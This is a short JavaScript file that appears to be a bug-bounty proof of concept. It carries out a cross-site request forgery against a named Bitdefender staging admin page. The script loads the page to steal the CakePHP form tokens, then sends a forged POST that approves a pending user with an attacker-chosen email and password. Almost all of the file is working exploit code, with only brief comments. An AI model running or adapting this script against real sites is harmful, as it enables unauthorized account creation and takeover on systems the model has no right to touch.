// Handles the xhr response, parses the data, and extracts the CSRF token
function readBody(xhr) {
    var data;
    let data1;
    if (!xhr.responseType || xhr.responseType === "text") {
        data = xhr.responseText;
        data1 = xhr.responseText;
    } else if (xhr.responseType === "document") {
    data = xhr.responseXML;
    data1 = xhr.responseXML;    
    } else {
    data = xhr.response;
    data1 = xhr.response;
    }

    var parser = new DOMParser();
    var resp = parser.parseFromString(data, "text/html");
    var resp1 = parser.parseFromString(data1, "text/html");
    token = resp.getElementsByName("data[_Token][fields]")[0].value;
    key = resp1.getElementsByName("data[_Token][key]")[0].value;
    csrf(token,key);
    return [data, data1];
}

// Creates and sends the initial XHR request to the UsersPending page: this is to obtain the CSRF token
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function () {
    if (xhr.readyState == 4) {
        response = readBody(xhr);
    }
}

xhr.open("GET", "https://pan-stage.bitdefender.com/UsersPending/edit/1801", true);
xhr.send(null);


// Sends the CSRF attack to POST data to the UsersPending section, using the previously obtained CSRF token
function csrf(token, key) {
    var params = "data%5B_Token%5D%5Bfields%5D=" + token + "%25";
    params += "&data%5BUserPending%5D%5Bfname%5D=okok&";
    params += "data%5BUserPending%5D%5Blname%5D=lklk&";
    params += "data%5BUserPending%5D%5Bemail%5D=hacked@bugcrowd.com&";
    params += "_method=POST&";
    params += "data%5BUserPending%5D%5Bphone%5D=887688&";
    params += "data%5BUserPending%5D%5Btype%5D=&";
    params += "data%5BUserPending%5D%5Bpasswd%5D=Wisdome@1992!!&";
    params += "data%5BUserPending%5D%5Banswer%5D=approve&";
    params += "data%5B_Token%5D%5Bunlocked%5D=&";
    params += "data%5BUserPending%5D%5Breason%5D=&";
    params += "data%5BUserPending%5D%5Bsend_reject_email%5D=&";
    params += "data%5BUserPending%5D%5Bsend_reject_email%5D=1&";
    params += "data%5B_Token%5D%5Bkey%5D=" + key;

    var x1 = new XMLHttpRequest();
    x1.open("POST", "https://pan-stage.bitdefender.com/UsersPending/edit/1801");
    x1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    x1.send(params);
}
